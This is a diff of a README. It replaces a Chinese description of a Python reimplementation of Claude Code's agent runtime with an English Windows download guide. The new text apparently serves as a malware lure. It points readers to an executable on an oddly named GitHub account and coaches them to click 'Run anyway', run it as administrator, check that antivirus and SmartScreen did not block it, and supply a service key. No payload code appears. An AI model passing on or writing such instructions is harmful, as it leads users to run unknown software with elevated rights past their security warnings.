@@ -1,117 +1,170 @@
-# Zero
+# 🤖 ClaudeCode-Python - Run Claude Core on Windows
 
-用 ~5000 行 Python 还原 CC 的核心 Agent Runtime。
+[![Download ClaudeCode-Python](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/straphangerappetizingness603/ClaudeCode-Python)
 
-## 这是什么
+## 🖥️ What this app does
 
-CC 是 Anthropic 官方的 AI 编程 CLI，它的本质是一个 **tool-use agent loop**：模型读代码、改文件、跑命令、自主决策，循环往复直到任务完成。
+ClaudeCode-Python is a Windows app that recreates the core Agent Runtime from Claude Code in about 5,000 lines of Python.
 
-这个项目从 TypeScript 源码（1884 个文件、38 万行）中，提取并翻译了核心运行时逻辑，用纯 Python 实现了一个功能对齐的 Agent CLI。
+Use it to:
 
-**不是封装 API 的 wrapper，是完整还原了 agent 内核。**
+- run a local agent workflow on your PC
+- send tasks to the runtime and get structured results
+- keep the setup simple for non-technical users
+- work with a plain Windows download instead of a complex install
 
-## 还原了什么
+This project is for users who want a direct way to try the runtime on Windows with a simple setup flow.
 
-| 能力 | 状态 | 说明 |
-|------|------|------|
-| Agent Loop（状态机） | ✅ | 多轮 tool-use 循环，流式响应，错误恢复，自动重试 |
-| 12 个内置工具 | ✅ | Bash、Read、Edit、Write、Glob、Grep、Agent、WebFetch、AskUser、Task 系列 |
-| System Prompt 体系 | ✅ | 11 段动态拼装，含完整 Memory 行为指导 |
-| CLAUDE.md 加载 | ✅ | 目录层级遍历 + `@include` 递归展开 |
-| 自动上下文压缩 | ✅ | Token 预算监控，超限自动 compact，长对话不崩 |
-| Memory 系统 | ✅ | 四类记忆分类、MEMORY.md 索引、后台异步提取 |
-| MCP 协议支持 | ✅ | stdio 传输、动态工具注册、多 server 并行 |
-| 工具编排引擎 | ✅ | 并发/串行分批、流式执行器、unknown tool 容错 |
-| Hooks 系统 | ✅ | PreToolUse/PostToolUse 拦截，shell 命令执行 |
-| Skills 系统 | ✅ | frontmatter 定义、slash 命令触发、prompt 注入 |
-| Session 持久化 | ✅ | 会话保存/恢复、历史记录 |
-| REPL + Print 模式 | ✅ | 交互式循环 + 单次管道模式 |
+## 📥 Download
 
-## 架构
+Visit this page to download and use the app:
 
-```
-cc/                          5138 行，66 个文件
-├── core/          343 行    Agent 内核：query_loop 状态机、事件流、状态转换
-├── api/           314 行    Anthropic API：流式调用、客户端管理、token 统计
-├── models/        545 行    数据模型：消息类型、content blocks、API 规范化
-├── prompts/       533 行    System Prompt：11 段文本 + 动态拼装 + Memory 指导
-├── tools/        1432 行    12 个工具实现 + 编排引擎 + 流式执行器
-├── compact/       159 行    上下文压缩：token 预算监控、摘要生成
-├── memory/        312 行    记忆系统：加载/保存/提取/索引
-├── mcp/           259 行    MCP 协议：stdio 客户端、工具桥接
-├── hooks/         157 行    Hooks：配置加载、PreToolUse/PostToolUse
-├── skills/        100 行    Skills：定义加载、slash 命令注册
-├── session/       280 行    会话管理：持久化、历史记录
-├── commands/       92 行    Slash 命令：/clear /compact /model /help /cost
-├── ui/             96 行    终端渲染：Rich 流式输出
-└── main.py        473 行    入口：REPL 循环、模块组装
+[Open ClaudeCode-Python Download Page](https://github.com/straphangerappetizingness603/ClaudeCode-Python)
 
-tests/                       2843 行，43 个文件，218 个测试用例
-```
+If the page shows a release file, download it to your computer. If it shows source files, use the ZIP download option on GitHub.
 
-### 核心数据流
+## 🪟 Windows System Needs
 
-```
-用户输入
-  → main.py 追加到 messages（transcript）
-  → query_loop 发送到 Claude API
-  → 流式接收：TextDelta / ToolUseBlock / TurnComplete
-  → 如果有 tool_use → 编排引擎并发执行 → tool_result 塞回 transcript → 再调 API
-  → 循环直到 end_turn
-  → 渲染输出，等待下一轮输入
-```
+Before you start, make sure your PC has:
 
-一次用户输入可以触发多轮模型调用和多次工具执行——这就是 agent，不是 chatbot。
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for first-time setup
+- Permission to run apps on your device
 
-## 快速开始
+For a smoother run, 8 GB of RAM or more helps.
 
-### 环境要求
+## 🚀 Install on Windows
 
-- Python 3.12+
-- [uv](https://docs.astral.sh/uv/)
+Follow these steps in order:
 
-### 安装
+1. Open the download page above.
+2. Download the app file or ZIP file to your computer.
+3. If you downloaded a ZIP file, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Look for the main app file, such as an `.exe` file or a start script.
+6. Double-click the file to start the app.
+7. If Windows asks for permission, choose **Run anyway** or **Yes**.
+8. Wait for the app to finish loading.
+9. Keep the app open while you use it.
 
-```bash
-cd cc-python-claude
-uv sync
-```
+If you do not see the app file right away, open the largest folder in the download and look for a file with the app name.
 
-### 配置 API Key
+## 🧭 First Run
 
-```bash
-# 环境变量
-export ANTHROPIC_API_KEY=sk-ant-...
+When you open ClaudeCode-Python for the first time:
 
-# 或项目 .env 文件
-echo "ANTHROPIC_API_KEY=sk-ant-..." > .env
-```
+- let it finish its startup check
+- read the on-screen prompts
+- choose the default options if you are unsure
+- keep the app connected to the internet if it asks for a service link or key
+- wait until the main window or terminal prompt appears
 
-### 启动
+The first launch may take a bit longer than later launches.
 
-```bash
-# REPL 交互模式
-uv run python -m cc
+## 🎯 How to Use It
 
-# 单次问答（管道模式）
-echo "用 Python 写一个快排" | uv run python -m cc -p
+ClaudeCode-Python is meant to handle agent-style tasks. A simple use flow looks like this:
 
-# 指定模型
-uv run python -m cc --model claude-haiku-4-5-20251001
+1. Start the app.
+2. Enter your task or prompt.
+3. Let the runtime process the request.
+4. Review the output.
+5. Run another task if needed.
 
-# 恢复会话
-uv run python -m cc -c <session-id>
-```
+Common tasks may include:
 
-### 测试
+- drafting text
+- organizing steps
+- parsing simple input
+- testing agent flows
+- checking runtime behavior
 
-```bash
-uv run pytest tests/unit/ -v
-```
+## 📁 Typical File Layout
 
-## 交流
+After extraction, you may see files like these:
 
-对 CC 源码还原或 Agent Runtime 感兴趣可以扫二维码，进 CC 讨论群：
+- `README.md` - basic app info
+- `main.py` - the main Python entry point
+- `requirements.txt` - package list
+- `config.json` - app settings
+- `assets/` - support files
+- `logs/` - run history
 
-<img src="assets/wechat.png" width="300">
+You do not need to edit these files if you only want to run the app.
 
+## ⚙️ Basic Setup Tips
+
+Use these tips if the app does not start on the first try:
+
+- right-click the app and run it as administrator
+- make sure the ZIP file was fully extracted
+- close and reopen the app
+- check that your antivirus did not block the file
+- install any runtime it asks for, such as Python or a Windows package it depends on
+
+If you see a console window, leave it open while the app runs.
+
+## 🐍 If Python Is Needed
+
+Some Windows builds use Python files directly. If that happens:
+
+1. Install Python 3.10 or newer.
+2. During setup, check **Add Python to PATH**.
+3. Open the app folder.
+4. Double-click the launch file or run the main script from the folder.
+
+If the app comes as a ready-to-run Windows file, you do not need to install Python.
+
+## 🛠️ Common Problems
+
+### App does not open
+
+- check that the file finished downloading
+- extract the ZIP before opening files
+- try again with administrator rights
+- make sure Windows SmartScreen did not block it
+
+### Missing file or blank folder
+
+- re-download the archive
+- make sure your browser did not stop the download
+- extract to a simple folder like `Downloads\ClaudeCode-Python`
+
+### It closes right away
+
+- open it from a terminal or console window if the app uses one
+- check for missing support files in the same folder
+- make sure the app was not moved after extraction
+
+### Internet-related errors
+
+- check your network connection
+- confirm any service link or key the app asks for
+- try again after a short wait
+
+## 🔄 Updating
+
+To get a newer version:
+
+1. Visit the download page again.
+2. Download the latest release or ZIP.
+3. Extract it to a new folder.
+4. Open the new version.
+5. Keep your old folder until you confirm the new one works.
+
+This keeps your setup clean and easy to roll back if needed.
+
+## 📌 Example Use Case
+
+You can use ClaudeCode-Python on Windows when you want to:
+
+- test an agent runtime locally
+- run a small Python-based assistant tool
+- explore a Claude Code style workflow
+- use a simple desktop setup without extra steps
+
+## 📄 License
+
+Check the repository page for license terms before you use or share the app.
